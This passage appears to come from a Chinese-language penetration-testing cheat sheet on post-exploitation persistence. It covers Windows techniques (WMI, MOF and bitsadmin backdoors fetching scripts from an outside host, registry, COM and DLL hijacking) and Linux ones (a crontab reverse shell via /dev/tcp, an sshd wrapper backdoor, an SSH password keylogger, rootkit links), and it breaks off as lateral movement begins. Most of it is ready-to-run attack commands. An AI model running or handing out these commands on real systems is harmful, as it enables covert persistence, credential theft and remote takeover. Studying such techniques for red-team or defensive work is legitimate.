+<li>儲存：  <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$StaticClass</span> = <span class="built_in">New-Object</span> Management.ManagementClass(<span class="string">&#x27;root\cimv2&#x27;</span>, <span class="variable">$null</span>, <span class="variable">$null</span>)</span><br><span class="line"><span class="variable">$StaticClass</span>.Name = <span class="string">&#x27;Win32_Command&#x27;</span></span><br><span class="line"><span class="variable">$StaticClass</span>.Put()</span><br><span class="line"><span class="variable">$StaticClass</span>.Properties.Add(<span class="string">&#x27;Command&#x27;</span>, <span class="variable">$Payload</span>)</span><br><span class="line"><span class="variable">$StaticClass</span>.Put()</span><br></pre></td></tr></table></figure></li>
+<li>讀取：  <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$Payload</span> = ([<span class="type">WmiClass</span>] <span class="string">&#x27;Win32_Command&#x27;</span>).Properties[<span class="string">&#x27;Command&#x27;</span>].Value</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li>包含數字簽名的 PE 文件，利用文件 hash 的演算法漏洞，在 PE 文件中隱藏 Payload，同時不影響該 PE 文件的數字簽名特殊 ADS …  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> putty.exe &gt; ...:putty.exe</span><br><span class="line">wmic process call create c:\<span class="built_in">test</span>\ads\...:putty.exe</span><br></pre></td></tr></table></figure></li>
+<li>特殊 COM 文件  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> putty.exe &gt; \\.\C:\<span class="built_in">test</span>\ads\COM1:putty.exe</span><br><span class="line">wmic process call create \\.\C:\<span class="built_in">test</span>\ads\COM1:putty.exe</span><br></pre></td></tr></table></figure></li>
+<li>磁碟根目錄  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> putty.exe &gt; C:\:putty.exe</span><br><span class="line">wmic process call create C:\:putty.exe</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li>Run/RunOnce Keys<ul>
+<li>用戶級  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce</span><br></pre></td></tr></table></figure></li>
+<li>管理員  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li>BootExecute Key<ul>
+<li>由於 <code>smss.exe</code> 在 Windows 子系統加載之前啟動，因此會調用配置子系統來加載當前的配置單元，具體註冊表鍵值為  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HKLM\SYSTEM\CurrentControlSet\Control\hivelist</span><br><span class="line">HKLM_LOCAL_MACHINE\SYSTEM\ControlSet002\Control\Session Manager</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li>Userinit Key<ul>
+<li>WinLogon 進程加載的 login scripts，具體鍵值  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersioon\Winlogon</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li>Startup Keys <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders</span><br><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders</span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders</span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders</span><br></pre></td></tr></table></figure></li>
+<li>Services<ul>
+<li>創建服務  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc create [ServerName] binPath = [BinaryPathName]</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li>Browser Helper Objects<ul>
+<li>本質上是 Internet Explorer 啟動時加載的 DLL 模組  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li>AppInit_DLLs<ul>
+<li>加載 User32.dll 會加載的 DLL  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li>文件關聯<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\Software\ClassesHKEY_CLASSES_ROOT</span><br></pre></td></tr></table></figure></li>
+<li><a target="_blank" rel="noopener" href="http://www.liuhaihua.cn/archives/357579.html">bitsadmin</a><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin /create backdoor</span><br><span class="line">bitsadmin /addfile backdoor %comspec% %temp%\cmd.exe</span><br><span class="line">bitsadmin.exe /SetNotifyCmdLine backdoor regsvr32.exe <span class="string">&quot;/u /s /i:https://host.com/calc.sct scrobj.dll&quot;</span></span><br><span class="line">bitsadmin /Resume backdoor</span><br></pre></td></tr></table></figure></li>
+<li><a target="_blank" rel="noopener" href="https://evi1cg.me/archives/Powershell_MOF_Backdoor.html">mof</a><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pragma namespace(<span class="string">&quot;\\\\.\\root\\subscription&quot;</span>)</span><br><span class="line">instance of __EventFilter as <span class="variable">$EventFilter</span>&#123;</span><br><span class="line">	EventNamespace = <span class="string">&quot;Root\\Cimv2&quot;</span>;</span><br><span class="line">	Name = <span class="string">&quot;filtP1&quot;</span>;</span><br><span class="line">	Query = <span class="string">&quot;Select * From __InstanceModificationEvent &quot;</span><span class="string">&quot;Where TargetInstance Isa \&quot;</span>Win32_LocalTime\<span class="string">&quot; &quot;</span><span class="string">&quot;And TargetInstance.Second = 1&quot;</span>;</span><br><span class="line">	QueryLanguage = <span class="string">&quot;WQL&quot;</span>;</span><br><span class="line">&#125;;</span><br><span class="line">instance of ActiveScriptEventConsumer as <span class="variable">$Consumer</span>&#123;</span><br><span class="line">	name = <span class="string">&quot;consP1&quot;</span>;</span><br><span class="line">	ScriptingEngine = <span class="string">&quot;JScript&quot;</span>;</span><br><span class="line">	SccriptText = <span class="string">&quot;GetObject(\&quot;</span>script:https://host.com/test\<span class="string">&quot;)&quot;</span>;</span><br><span class="line">&#125;;</span><br><span class="line">instance of __FilterToConsumerBinding&#123;</span><br><span class="line">	Consumer = <span class="variable">$Consumer</span>;</span><br><span class="line">	<span class="keyword">Filter</span> = <span class="variable">$EventFilter</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>管理員執行  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mofcomp test.mof</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li>wmi<ul>
+<li><a target="_blank" rel="noopener" href="https://3gstudent.github.io/Study-Notes-Weekly-No.1(Monitor-WMI_ExportsToC++_Use-DiskCleanup-bypass-UAC)">Study Notes Weekly No.1(Monitor WMI &amp; ExportsToC++ &amp; Use DiskCleanup bypass UAC</a></li>
+<li>每隔 60 秒執行一次 notepad.exe<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wmic /NAMESPACE:<span class="string">&quot;\\root\subscription&quot;</span> PATH __EventFilter CREATE Name=<span class="string">&quot;BotFilter82&quot;</span>, EventNameSpace=<span class="string">&quot;root\cimv2&quot;</span>, QueryLanguage=<span class="string">&quot;WQL&quot;</span>, Query=<span class="string">&quot;SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA &#x27;WIN32_PerfFormattedData_PerfOS_System&#x27;&quot;</span></span><br><span class="line">wmic /NAMESPACE:<span class="string">&quot;\\root\subscription&quot;</span> PATH CommandLineEventConsumer CREATE Name=<span class="string">&quot;BotConsumer23&quot;</span>, ExecutablePath=<span class="string">&quot;C:\Windows\System32otepad.exe&quot;</span>, CommandLineTemplate=<span class="string">&quot;C:\Windows\System32otepad.exe&quot;</span></span><br><span class="line">wmic /NAMESPACE=<span class="string">&quot;\\root\subscription&quot;</span> PATH __FilterToConsumerBinding CREATE Filter=<span class="string">&quot;__EventFilter.Name=\&quot;BotFilter82\&quot;&quot;</span>, Consumer=<span class="string">&quot;CommandLineEventConsumer.Name=\&quot;BotConsumer23\&quot;&quot;</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li>Userland Persistence With Scheduled Tasks<ul>
+<li><a target="_blank" rel="noopener" href="https://3gstudent.github.io/Userland-registry-hijacking">Userland registry hijacking</a></li>
+<li>劫持計畫任務 UserTask，在系統啟動時加載 dll<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Invoke-ScheduledTaskComHandlerUserTask</span></span>&#123;</span><br><span class="line">	<span class="function">[<span class="type">CmdletBinding</span>(<span class="type">SupportsShouldProcess</span> = <span class="variable">$True</span>, <span class="type">ConfirmImpact</span> = <span class="string">&#x27;Medium&#x27;</span>)]<span class="keyword">Param</span></span>(</span><br><span class="line">		[<span class="type">Parameter</span>(<span class="type">Mandatory</span> = <span class="variable">$True</span>)][<span class="type">ValidateNotNullOrEmpty</span>()][<span class="built_in">String</span>]<span class="variable">$Command</span>, [<span class="type">Switch</span>]<span class="variable">$Force</span>)</span><br><span class="line">	<span class="variable">$ScheduledTaskCommandPath</span> = <span class="string">&quot;HKCU:\Software\Classes\CLSID\&#123;58fb76b9-ac85-4e55-ac04-427593b1d060&#125;\InprocServer32&quot;</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$Force</span> <span class="operator">-or</span> ((<span class="built_in">Get-ItemProperty</span> <span class="literal">-Path</span> <span class="variable">$ScheduledTaskCommandPath</span> <span class="literal">-Name</span> <span class="string">&#x27;(default)&#x27;</span> <span class="literal">-ErrorAction</span> SilentlyContinue) <span class="operator">-eq</span> <span class="variable">$null</span>))&#123;</span><br><span class="line">		<span class="built_in">New-Item</span> <span class="variable">$ScheduledTaskCommandPath</span> <span class="literal">-Force</span> | <span class="built_in">New-ItemProperty</span> <span class="literal">-Name</span> <span class="string">&#x27;(Default)&#x27;</span> <span class="literal">-Value</span> <span class="variable">$Command</span> <span class="literal">-PropertyType</span> string <span class="literal">-Force</span> | <span class="built_in">Out-Null</span></span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="built_in">Write-Verbose</span> <span class="string">&quot;Key already exists, consider using -Force&quot;</span></span><br><span class="line">		<span class="keyword">exit</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">Test-Path</span> <span class="variable">$ScheduledTaskCommandPath</span>)&#123;</span><br><span class="line">		<span class="built_in">Write-Verbose</span> <span class="string">&quot;Created registry entries to hijack the UserTask&quot;</span></span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="built_in">Write-Warning</span> <span class="string">&quot;Failed to create registry key, exiting&quot;</span></span><br><span class="line">		<span class="keyword">exit</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">Invoke-ScheduledTaskComHandlerUserTask</span> <span class="literal">-Command</span> <span class="string">&quot;C:\test\testmsg.dll&quot;</span> <span class="literal">-Verbose</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li>Netsh<ul>
+<li><a target="_blank" rel="noopener" href="https://3gstudent.github.io/backup-3gstudent.github.io/Netsh-persistence/">Netsh persistence</a><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh add helper c:\testetshtest.dll</span><br></pre></td></tr></table></figure></li>
+<li>後門觸發：每次調用 netsh</li>
+<li>dll 編寫：<a target="_blank" rel="noopener" href="https://github.com/outflanknl/NetshHelperBeacon">NetshHelperBeacon</a></li>
+</ul>
+</li>
+<li>Shim<ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/3gstudent/3gstudent.github.io/blob/main/_posts/2016-10-19-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84Application%20Compatibility%20Shims.md">渗透测试中的Application Compatibility Shims</a></li>
+<li>常用方式：<ul>
+<li>InjectDll</li>
+<li>RedirectShorcut</li>
+<li>RedirectEXE</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>DLL 劫持<ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/3gstudent/3gstudent.github.io/blob/main/_posts/2016-12-7-DLL%E5%8A%AB%E6%8C%81%E6%BC%8F%E6%B4%9E%E8%87%AA%E5%8A%A8%E5%8C%96%E8%AF%86%E5%88%AB%E5%B7%A5%E5%85%B7Rattler%E6%B5%8B%E8%AF%95.md">DLL劫持漏洞自动化识别工具Rattler测试</a></li>
+<li>通過 Rattler 自動枚舉進程，檢測是否存在可用 dll 劫持利用的進程</li>
+<li>使用：Procmon 半自動測試更精準，常規生成的 dll 會導致程序執行報錯或中斷，使用 AheadLib 配合生成 dll 劫持利用源碼不會影響程序執行</li>
+<li>工具：<ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/sensepost/rattler">rattler</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/Yonsm/AheadLib">AheadLib</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>DoubleAgent<ul>
+<li><a target="_blank" rel="noopener" href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84Application-Verifier(DoubleAgent%E5%88%A9%E7%94%A8%E4%BB%8B%E7%BB%8D)">渗透测试中的Application Verifier(DoubleAgent利用介绍)</a></li>
+<li>編寫自定義 Verifier provider DLL</li>
+<li>通過 Applicatioon Verifer 進行安裝</li>
+<li>注入到目標進程執行 payload 每當目標進程啟動，均會執行 payload，相當於一個自啟動的方式</li>
+<li>PoC：<a target="_blank" rel="noopener" href="https://github.com/Cybellum/DoubleAgent">DoubleAgent</a></li>
+</ul>
+</li>
+<li>waitfor.exe<ul>
+<li><a target="_blank" rel="noopener" href="https://3gstudent.github.io/Use-Waitfor.exe-to-maintain-persistence">Use Waitfor.exe to maintain persistence</a></li>
+<li>不支持自啟動，但可遠端主動啟用，後端進程顯示為 waitfor.exe</li>
+<li>PoC：<a target="_blank" rel="noopener" href="https://github.com/3gstudent/Waitfor-Persistence">Waitfor-Persistence</a></li>
+</ul>
+</li>
+<li>AppDomainManager<ul>
+<li><a target="_blank" rel="noopener" href="https://3gstudent.github.io/backup-3gstudent.github.io/Use-AppDomainManager-to-maintain-persistence/">Use AppDomainManager to maintain persistence</a></li>
+<li>針對 .Net 程序，通過修改 AppDomainManager 能夠劫持 .Net 程序的啟動過程。如果劫持了系統常見 .Net 程序如 powershell.exe 的啟動進程，向其添加 payload，就能實現一種被動的後門觸發機制</li>
+</ul>
+</li>
+<li>Office<ul>
+<li>劫持 Office 軟體的特定功能：<a target="_blank" rel="noopener" href="https://3gstudent.github.io/backup-3gstudent.github.io/%E5%88%A9%E7%94%A8BDF%E5%90%91DLL%E6%96%87%E4%BB%B6%E6%A4%8D%E5%85%A5%E5%90%8E%E9%97%A8/">利用BDF向DLL文件植入后门</a></li>
+<li>通過 dll 劫持，在 Office 軟體執行特定功能時觸發後門</li>
+<li>利用 VSTO 實現的 Office 後門</li>
+<li>Office 加載項<ul>
+<li>Word WLL</li>
+<li>Excel XLL</li>
+<li>Excel VBA add-ins</li>
+<li>PowerPoint VBA add-ins</li>
+</ul>
+</li>
+<li>參考：<ul>
+<li><a target="_blank" rel="noopener" href="https://3gstudent.github.io/backup-3gstudent.github.io/Use-Office-to-maintain-persistence/">Use Office to maintain persistence</a></li>
+<li><a target="_blank" rel="noopener" href="https://3gstudent.github.io/backup-3gstudent.github.io/Office-Persistence-on-x64-operating-system/">Office Persistence on x64 operating system</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>CLR<ul>
+<li><a target="_blank" rel="noopener" href="https://3gstudent.github.io/backup-3gstudent.github.io/Use-CLR-to-maintain-persistence/">Use CLR to maintain persistence</a></li>
+<li>無需管理員權限的後門，並能夠劫持所有 .Net 程序</li>
+<li>PoC：<a target="_blank" rel="noopener" href="https://github.com/3gstudent/CLR-Injection">CLR-Injection</a></li>
+</ul>
+</li>
+<li>msdtc<ul>
+<li><a target="_blank" rel="noopener" href="https://3gstudent.github.io/backup-3gstudent.github.io/Use-msdtc-to-maintain-persistence/">Use msdtc to maintain persistence</a></li>
+<li>利用 MSDTC 服務加載 dll，實現自啟動，並繞過 Autoruns 對啟動項的檢測</li>
+<li>利用：向 %windir%\system32\ 目錄添加 dll 並重命名為 oci.dll</li>
+</ul>
+</li>
+<li>Hijack CAccPropServicesClass and MMDeviceEnumerator<ul>
+<li><a target="_blank" rel="noopener" href="https://3gstudent.github.io/backup-3gstudent.github.io/Use-COM-Object-hijacking-to-maintain-persistence-Hijack-CAccPropServicesClass-and-MMDeviceEnumerator/">Use COM Object hijacking to maintain persistence——Hijack CAccPropServicesClass and MMDeviceEnumerator</a></li>
+<li>利用 COM 組件，不需要重啟系統，不需要管理員權限</li>
+<li>通過修改註冊表實現</li>
+<li>PoC：<a target="_blank" rel="noopener" href="https://github.com/3gstudent/COM-Object-hijacking">COM-Object-hijacking</a></li>
+</ul>
+</li>
+<li>Hijack explorer.exe<ul>
+<li><a target="_blank" rel="noopener" href="https://3gstudent.github.io/backup-3gstudent.github.io/Use-COM-Object-hijacking-to-maintain-persistence-Hijack-explorer.exe/">Use COM Object hijacking to maintain persistence——Hijack explorer.exe</a></li>
+<li>COM 組件劫持，不需要重啟系統，不需要管理員權限</li>
+<li>通過修改註冊表實現<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HKCU\Software\Classes\CLSID&#123;42aedc87-2188-41fd-b9a3-0c966feabec1&#125;</span><br><span class="line">HKCU\Software\Classes\CLSID&#123;fbeb8a05-beee-4442-804e-409d6c4515e9&#125;</span><br><span class="line">HKCU\Software\Classes\CLSID&#123;b5f8350b-0548-48b1-a6ee-88bd00b4a5e7&#125;</span><br><span class="line">HKCU\Software\Classes\Wow6432Node\CLSID&#123;BCDE0395-E52F-467C-8E3D-C4579291692E&#125;</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li>Windows FAC DLL Injection<ul>
+<li>加載 Explorer.exe 在啟動時會加載 c:\Windows\System32\fxsst.dll  (服務預設開啟，用於傳真服務)，將 payload.dll 保存在 c:\Windows\fxsst.dll，能夠實現 dll 劫持 (劫持 Explorer.exe 對 fxsst.dll 的加載)</li>
+</ul>
+</li>
+<li>特殊註冊表鍵值<ul>
+<li>在註冊表啟動項創建特殊名稱的註冊表鍵值，用戶正常情況下無法讀取 (使用 Win32 API)，但系統能夠執行 (使用 Native API)</li>
+<li>參考：<ul>
+<li><a target="_blank" rel="noopener" href="https://3gstudent.github.io/backup-3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E9%9A%90%E8%97%8F-%E6%B3%A8%E5%86%8C%E8%A1%A8%E7%9A%84%E5%88%9B%E5%BB%BA/">渗透技巧——“隐藏”注册表的创建</a></li>
+<li><a target="_blank" rel="noopener" href="https://3gstudent.github.io/backup-3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E9%9A%90%E8%97%8F-%E6%B3%A8%E5%86%8C%E8%A1%A8%E7%9A%84%E6%9B%B4%E5%A4%9A%E6%B5%8B%E8%AF%95/">渗透技巧——“隐藏”注册表的更多测试</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>快捷方式後門<ul>
+<li>替換我的電腦快捷方式啟動參數</li>
+<li>PoC：<a target="_blank" rel="noopener" href="https://github.com/Ridter/Pentest/blob/master/powershell/MyShell/Backdoor/LNK_backdoor.ps1">LNK_backdoor</a></li>
+</ul>
+</li>
+<li>Logon Scripts<ul>
+<li><a target="_blank" rel="noopener" href="https://3gstudent.github.io/backup-3gstudent.github.io/Use-Logon-Scripts-to-maintain-persistence/">Use Logon Scripts to maintain persistence</a><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">New-ItemProperty</span> <span class="string">&quot;HKCU:\Environment\&quot;</span> UserInitMprLogonScript <span class="literal">-value</span> <span class="string">&quot;c:\test\11.bat&quot;</span> <span class="literal">-propertyType</span> string | <span class="built_in">Out-Null</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li>Password Filter DLL<ul>
+<li><a target="_blank" rel="noopener" href="https://3gstudent.github.io/backup-3gstudent.github.io/Password-Filter-DLL%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/">Password Filter DLL在渗透测试中的应用</a></li>
+</ul>
+</li>
+<li>利用 BHO 實現 IE 瀏覽器劫持<ul>
+<li><a target="_blank" rel="noopener" href="https://3gstudent.github.io/backup-3gstudent.github.io/%E5%88%A9%E7%94%A8BHO%E5%AE%9E%E7%8E%B0IE%E6%B5%8F%E8%A7%88%E5%99%A8%E5%8A%AB%E6%8C%81/">利用BHO实现IE浏览器劫持</a></li>
+</ul>
+</li>
+</ol>
+<h4 id="Linux-1"><a href="#Linux-1" class="headerlink" title="Linux"></a>Linux</h4><ul>
+<li>crontab<ul>
+<li>每 60 分鐘反彈一次 shell 給 dns.wuyun.org 的 53 埠  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!bash</span></span><br><span class="line">(crontab -l;<span class="built_in">printf</span> <span class="string">&quot;*/60 * * * * exec 9&lt;&gt; /dev/tcp/dns.wuyun.org/53;exec 0&lt;&amp;9;exec 1&gt;&amp;9 2&gt;&amp;1;/bin/bash --noprofile -i;\rno crontab for `whoami`%100c&quot;</span>)|crontab -</span><br></pre></td></tr></table></figure></li>
+<li>應鏈接 sshd  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!bash</span></span><br><span class="line">ln -sf /usr/sbin/sshd /tmp/su; /tmp/su -oPort=2333;</span><br></pre></td></tr></table></figure></li>
+<li>鏈接：<code>ssh root@192.168.206.142 -p 2333</code></li>
+</ul>
+</li>
+<li>SSH Server wrapper  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!bash</span></span><br><span class="line"><span class="built_in">cd</span> /usr/sbin</span><br><span class="line">mv sshd ../bin</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;#!/usr/bin/perl&#x27;</span> &gt;sshdecho <span class="string">&#x27;exec &quot;/bin/sh&quot; if (getpeername(STDIN) =~ /^..4A/);&#x27;</span> &gt;&gt;sshd</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;exec &#123;&quot;/usr/bin/sshd&quot;&#125; &quot;/usr/sbin/sshd&quot;,@ARGV,&#x27;</span> &gt;&gt;sshd</span><br><span class="line">chmod u+x sshd</span><br><span class="line"></span><br><span class="line"><span class="comment">#不用重啟也行</span></span><br><span class="line">/etc/init.d/sshd restart</span><br><span class="line"></span><br><span class="line">socat STDIO TCP4:192.168.206.142:22,sourceport=13377</span><br></pre></td></tr></table></figure></li>
+<li>SSH keylogger<ul>
+<li>vim 當前用戶下的 <code>.bashrc</code> 文件，末尾添加<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!bash</span></span><br><span class="line"><span class="built_in">alias</span> ssh=<span class="string">&#x27;strace -o /tmp/sshpwd-`date &#x27;</span>+%d%h%m%s<span class="string">&#x27;`.log -e read,write,connect -s2048 ssh&#x27;</span><span class="built_in">source</span> .bashrc</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li>Cymothoa_進程注入 backdoor  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./cymothoa -p 2270 -s 1 -y 7777</span><br><span class="line">nc -vv ip 7777</span><br></pre></td></tr></table></figure></li>
+<li>rootkit<ul>
+<li><a target="_blank" rel="noopener" href="http://core.ipsecs.com/rootkit/patch-to-hack/0x06-openssh-5.9p1.patch.tar.gz">openssh_rootkit</a></li>
+<li><a target="_blank" rel="noopener" href="http://core.ipsecs.com/rootkit/kernel-rootkit/ipsecs-kbeast-v1.tar.gz">Kbeast_rootkit</a></li>
+<li>Mafix + Suterusu rootkit</li>
+<li>Tools<ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/Screetsec/Vegile">Vegile</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/icco/backdoor">backdoor</a></li>
+</ul>
+</li>
+<li>WEB 後門<ul>
+<li>PHP Meterpreter 後門</li>
+<li>Aspx Meterpreter 後門</li>
+<li>weevely</li>
+<li>webacoo</li>
+<li>…</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h2 id="0x06-橫向移動"><a href="#0x06-橫向移動" class="headerlink" title="0x06 橫向移動"></a><strong><u>0x06 橫向移動</u></strong></h2><h3 id="埠滲透"><a href="#埠滲透" class="headerlink" title="埠滲透"></a><em>埠滲透</em></h3><h4 id="埠掃描"><a href="#埠掃描" class="headerlink" title="埠掃描"></a>埠掃描</h4><ol>
+<li>埠的指紋情資 (版本情資)</li>
+<li>埠所對應進行的服務</li>
+<li>常見的預設埠號</li>
+<li>嘗試弱密碼</li>
+</ol>
+<h4 id="埠爆破"><a href="#埠爆破" class="headerlink" title="埠爆破"></a>埠爆破</h4><ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/vanhauser-thc/thc-hydra">hydra</a></li>
+</ul>
+<h4 id="埠弱密碼"><a href="#埠弱密碼" class="headerlink" title="埠弱密碼"></a>埠弱密碼</h4><ul>
+<li>NTScan</li>
+<li>Hscan</li>
+<li>自寫腳本</li>
+</ul>
+<h4 id="埠溢出"><a href="#埠溢出" class="headerlink" title="埠溢出"></a>埠溢出</h4><ul>
+<li>smb<ul>
+<li>ms08067</li>
+<li>ms17010</li>
+<li>ms11058</li>
+<li>…</li>
+</ul>
+</li>
+<li>apacheftp<br>…</li>
+</ul>
+<h4 id="常見的默認埠"><a href="#常見的默認埠" class="headerlink" title="常見的默認埠"></a>常見的默認埠</h4><ol>
+<li>web 類 (web 漏洞 / 敏感目錄)<ul>
